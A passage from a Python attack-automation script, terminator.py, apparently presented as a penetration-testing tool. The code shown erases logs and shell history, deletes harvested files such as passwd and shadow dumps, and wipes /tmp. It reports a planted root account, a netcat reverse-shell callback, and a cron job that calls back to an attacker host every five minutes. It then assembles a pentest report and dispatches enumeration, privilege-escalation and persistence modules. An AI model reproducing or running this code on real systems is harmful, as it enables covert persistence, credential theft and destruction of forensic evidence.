   os.system("echo /tmp/.backups/httpd > /var/log/httpd 2>/dev/null")
   os.system("echo /tmp/.backups/.bash_history > ~/.bash_history 2>/dev/null")
   os.system("echo /tmp/.backups/.bash_history > /root/.bash_history 2>/dev/null")
   os.system("echo /tmp/.backups/history > $history 2>/dev/null")

   print("\n### deleting script and exiting... ###")
   os.system("rm -rf /tmp/.backups/ 2>/dev/null")
   os.system("rm -rf /tmp/.path/ 2>/dev/null")
   os.system("rm -f /tmp/whoami.txt")
   os.system("rm -f /tmp/pwd.txt")
   os.system("rm -f /tmp/sudo_l.txt")
   os.system("rm -f /tmp/data_exfil.txt")
   os.system("rm -f /tmp/check.txt")
   os.system("rm -f /tmp/suid.txt")
   os.system("rm -f /tmp/passwd.txt")
   os.system("rm -f /tmp/shad.txt")
   os.system("rm -f /tmp/esc.txt")
   os.system("rm -f /tmp/suid_esc.txt")
   os.system("rm -f /tmp/path_res.txt")
   os.system("rm -f /tmp/passwd_res.txt")
   os.system("rm -f /tmp/shad_res.txt")
   os.system("rm -f /tmp/priv.txt")
   os.system("rm -f /tmp/print.txt")
   os.system("rm -f /tmp/scp.txt")
   os.system("rm -rf /tmp/* 2>/dev/null")

   # print persistence info to screen
   print("\n\n### persistence established with the following ###")
   print("- user {}:{} was added with root privileges".format(username,password))
   print("- nc reverse shell callback implanted at /dev/shm/.data/data_log")
   print("- cronjob created to execute nc reverse shell callback every 5 minutes to {}:{}\n".format(local_ip,local_port))

   # delete terminator.py file
   os.system("rm -f terminator.py")
   exit()


# report ###############################

# add contents from enum.txt, priv.txt, and data_exfil.txt to file with -o output file name
def report(output):
   # get target ip from enum.txt
   ipf = open("/terminator/enum.txt")
   ipread = ipf.readline()
   ipsplit = ipread.split(" ")
   ip = ipsplit[-2].strip()

   os.system("touch /terminator/report.txt")
   os.system("echo '-+- Penetration Testing Report for {} -+-' > /terminator/report.txt".format(ip))
   os.system("echo '' >> /terminator/report.txt")
   os.system("echo '+ + + Enumeration + + +' >> /terminator/report.txt")
   os.system("echo '' >> /terminator/report.txt")
   os.system("cat /terminator/enum.txt >> /terminator/report.txt")
   os.system("echo '' >> /terminator/report.txt")
   os.system("echo '+ + + Exploitation / Initial Shell + + +' >> /terminator/report.txt")
   os.system("echo '' >> /terminator/report.txt")
   os.system(" echo '*** ADD YOUR EXPLOITION METHOD FOR THE INITAL SHELL HERE ***' >> /terminator/report.txt")
   os.system("echo '' >> /terminator/report.txt")
   os.system("echo '+ + + Privilege Escalation + + +' >> /terminator/report.txt")
   os.system("echo '' >> /terminator/report.txt")
   os.system("cat /terminator/priv.txt >> /terminator/report.txt")
   os.system("echo '' >> /terminator/report.txt")
   os.system("echo '+ + + Persistence and Data Exfiltration + + +' >> /terminator/report.txt")
   os.system("cat /terminator/data_exfil.txt >> /terminator/report.txt")
   os.system("echo '' >> /terminator/report.txt")
   os.system("echo '' >> /terminator/report.txt")
   os.system("echo '--- END OF REPORT ---' >> /terminator/report.txt")
   os.system("mv /terminator/report.txt /terminator/{}".format(output))
   print("### penetration test report for {} is ready at /terminator/{} ###\n### please add your method for gaining the initial shell in the '+ + + Stage 2 - Exploitation / Initial Shell + + +' section. ###\n###all reference data for enumeration, privilege escalation, and persistence/data exfiltration are located in /terminator/ as enum.txt, priv.txt, and data_exfil.txt, respectively ###".format(ip,output))
   ipf.close()


# check if docx is installed on machine
def lib_check():
   try:
      import docx
      import sys
      "docx" in sys.modules
   except:
      return False
   else:
      return True


# make Word (docx) file and fill with contents from terminator.py output
def doc_make(output):
   # import docx library
   from docx import Document

   # get target ip from enum.txt
   ipf = open("/terminator/enum.txt")
   ipread = ipf.readline()
   ipsplit = ipread.split(" ")
   ip = ipsplit[-2].strip()

   # check for .txt extension and get report name
   txt = re.search("txt\Z", output)
   dot = re.findall("[.]", output)
   if dot.len() > 1:
      if txt:
         cut = output[:-4]
      else:
         cut = output
   elif dot.len() == 1:
      fsplit = output.split(".")
      cut = fsplit[0].strip()
   else:
      cut = output

   # create and fill document
   document = Document()
   e = open("/terminator/enum.txt")
   p = open("/terminator/priv.txt")
   x = open("/terminator/data_exfil.txt")
   ee = e.read()
   pp = p.read()
   xx = x.read()

   document.add_heading("Penetration Testing Report for {}".format(ip), 0)
   document.add_heading("Enumeration", level=1)
   document.add_paragraph(ee)
   document.add_page_break()
   document.add_heading("Exploitation / Initial Shell", level=1)
   document.add_paragraph("*** ADD YOUR EXPLOITION METHOD FOR THE INITAL SHELL HERE ***")
   document.add_page_break()
   document.add_heading("Privilege Escalation", level=1)
   document.add_paragraph(pp)
   document.add_page_break()
   document.add_heading("Persistence and Data Exfiltration", level=1)
   document.add_paragraph(xx)
   document.save("{}.docx".format(cut))
   os.system("mv {}.docx /terminator/{}.docx".format(cut,cut))

   e.close()
   p.close()
   x.close()
   ipf.close()

   print("-+- Word document saved to /terminator/{}.docx -+-".format(cut))


# call functions
if module == "enum":
   # call enumeration functions
   # prevent rerunning functions if more than one instance of service
   webc = 0
   smbc = 0
   ftpc = 0
   nfsc = 0
   services = init_scan(ip)
   for line in services:
      l = line.split(" ")
      for valueu in l:
         value = valueu.lower()
         if "http" in value:
            if webc == 0:
               web(ip,wordlist,services)
               webc = 1
            else:
               continue
         elif "smb" in value or "samba" in value:
            if smbc == 0:
               smb(ip)
               smbc = 1
            else:
               continue
         elif "ftp" in value:
            if ftpc == 0:
               ftp(ip)
               ftpc = 1
            else:
               continue
         elif "nfs" in value or "rpc" in value:
            if nfsc == 0:
               nfs(ip)
               nfsc = 1
            else:
               continue
         else:
           continue
   imp_enum(ip)
   os.system("echo ''")
   os.system("echo ''")
   os.system("echo '### end of enumeration ###' | tee -a /terminator/enum.txt")
elif module == "priv":
   # call privilege escalation functions
   disable_hist()
   sudo_l()
   suid()
   path()
   pass_shadow(username,password)
   root_check()
elif module == "root":
   # call persistence and data exfil functions
   is_root = perm_check()
   # check for root permissions
   if is_root or args.force:
      disable_hist()
      add_user(username, password)
      callback(local_ip, local_port)
      cron_make()
      extract(username,password,local_ip,local_port)
      export(local_ip)
      clear_tracks(username,password,local_ip,local_port)
elif module == "report":
   # call report functions
   report(output)
   lib = lib_check()
   print(lib)
   if lib:
      doc_make(output)
   else:
      print("\n*** 'python-docx' is not installed on your machine; please run 'pip install python-docx' in your terminal ***")
   print("\n\n-+- target has been terminated -+-")
else:
   print("\n*** specify either 'enum', 'priv', 'root' or 'report' ***")
